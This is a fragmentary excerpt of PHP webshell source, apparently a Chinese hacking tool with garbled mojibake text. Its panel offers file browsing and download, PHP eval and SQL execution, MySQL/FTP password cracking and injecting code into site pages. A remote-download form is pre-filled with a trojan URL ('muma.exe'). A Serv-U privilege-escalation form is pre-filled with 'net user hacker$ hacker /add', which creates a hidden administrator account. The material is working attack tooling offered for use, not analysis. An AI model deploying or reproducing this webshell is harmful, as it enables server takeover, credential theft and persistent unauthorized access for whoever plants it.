...
/*===================== ֤ =====================*/
if($admin['check'] == "1") {if ($_GET['action'] == "logout") {setcookie ("adminpass", "");echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$self."\">";echo "<span style=\"font-size: 12px; font-family: Verdana\">עɹ......<p><a href=\"".$self."\">Զ˳򵥻˳ &gt;&gt;&gt;</a></span>";exit;}
...
// ļ
if (!empty($downfile)) {if (!@file_exists($downfile)) {echo "<script>alert('Ҫµļ!')</script>";} else {$filename = basename($downfile);$filename_info = explode('.', $filename);$fileext = $filename_info[count($filename_info)-1];header('Content-type: application/x-'.$fileext);header('Content-Disposition: attachment; filename='.$filename.'');header('Content-Description: PHP Generated Data');header('Content-Length: '.filesize($downfile));@readfile($downfile);exit;}
}
// ֱرݿ
...
<body style="table-layout:fixed; word-break:break-all onmouseover="window.status=':  վԱȫ,ʹڷǷ;,߸Ų';return true" style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)">
<center>
<?php
//$_SERVER["DOCUMENT_ROOT"]
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="center">'.date("Ymd h:i:s",time()).'</td><td align="right"><b>'.gethostbyname($_SERVER['SERVER_NAME']).'</b></td></tr></table>','center','top');
$tb->tdbody('<a href="?dir='.$dirpath.'">Ŀ¼</a> | <a href="?action=dir">ShellĿ¼</a> | <a href="?action=phpenv"></a> | <a href="?action=proxy">ߴ</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=crack">ƽ</a> | <a href="?action=mix">ѹmix.dll</a> | <a href="?action=logout">ע¼</a>');
$tb->tdbody('<a href="?action=plgm"></a> | <a href="?action=downloads">Httpļ</a> | <a href="?action=search&dir='.$dir.'">ļ</a> | <a href="?action=eval">ִphpű</a> | <a href="?action=sql">ִSQL</a> | <a href="?action=mysqlfun">FuncShell</a> | <a href="?action=sqlbak">MySQL</a> | <a href="?action=SUExp">Serv-UȨ</a>');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>·: '.$pathname.'<br>ǰĿ¼('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>תĿ¼: '.$tb->makeinput('dir',''.$nowpath.'','','text','80').' '.$tb->makeinput('','ȷ','','submit').' ֧־··'));
...
elseif ($_GET['action'] == "plgm") {
	...
	$tb->tdbody('վphp','center');
	$tb->tdbody('ļλ: '.$tb->makeinput('dir',''.$_SERVER["DOCUMENT_ROOT"].'','','text','60').'<br>ҪҴ:'.$tb->maketextarea('mm',$gm,'50','5').''.$tb->makehidden('do','').'<br>'.$tb->makeinput('submit','ʼ','','submit'),'center','1','35');
	echo "</form>";
	$tb->tablefooter();
}//end plgm
// ¡ʱ
...
elseif ($do == 'crack') {//עΪȫֱˡ
	if(@file_exists($passfile)){
		...
		if($turn>$tt or $onetime>$count){
			...
			if(!$t){
				echo "<meta http-equiv=\"refresh\" content=\"".$admin[jumpsecond].";URL=".$self."?do=crack&passfile=".$passfile."&host=".$host."&user=".$user."&turn=".$nowturn."&onetime=".$onetime."&ctype=".$ctype."\"><span style=\"font-size: 12px; font-family: Verdana\"><a href=\"".$self."?do=crack&passfile=".$passfile."&host=".$host."&user=".$user."&turn=".$nowturn."&onetime=".$onetime."&type=".$ctype."\">ֵܹ".$count."ڴ".$first."".$now."".$admin[jumpsecond]."".$onetime."̽. &gt;&gt;&gt;</a><br>ȫ˴".$type."ƽҪ".$tt."Σǵ".$turn."νܡ</span>";
	}
	else {
		echo"$t";
		}
...
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	...
	echo "$notice";
	echo "<a href=\"?dir=C:/Program%20Files/\">Program</a> | <a href=\"?dir=C:/Documents%20and%20Settings/All%20Users/Application%20Data/Symantec/pcAnywhere\">pcAnywhere</a> | <a href=\"?dir=C:/Documents%20and%20Settings/All%20Users/ʼ˵/\">ʼ</a> | <a href=\"?dir=C:/Documents%20and%20Settings/All%20Users\">AllUsers</a> | <a href=\"?dir=C:/Program Files/RhinoSoft.com/Serv-U\">Serv-U</a> | ";
...
else $z = "<a href=\"#\" title=\"ʹ˵\" onclick=\"alert('PhpзǰȫģʽȰȰȰ\\n\\nдļļڱطֱء')\">(?)</a>";
...
$action = '?action=dir';
	...
	$tb->tdbody('ļλ: '.$tb->makeinput('durl','http://google.com/muma.exe','','text','70').'<br>ص:'.$tb->makeinput('path','./muma.exe','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','','','submit'),'center','1','35');
	echo "</form>";
...
$action = '?action=dir';
	...
	if($type=="crack"){
	$tb->formheader($action,'ƽmysqlftp <a href="?action=crack">[Mysql]</a>');
	...
	$tb->formheader("".$action."\" enctype=\"multipart/form-data",'ʹMysqlϴļ <a href="?action=crack&type=crack">[Crack]</a>');
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <tr class="secondalt">
	...
	?>
      Command:
      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user hacker$ hacker /add" size="50"> &nbsp;<a href="?action=SUExp&job=adduser">(û)</a> -  <a href="#" title="ʹ˵" onClick="alert('ѡûhacker$ΪhackerʺŲEXPɾhacker\n\nûԼһԱʺõģִsite exec \n\nõһѡĿ¼ȫȨ޵')">(?)</a>
...
<table width="775" border="0" cellpadding="0">
  <tr>
    <td><FONT color=#ff3300>:ʹñ·ǷΪԸ</font></td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
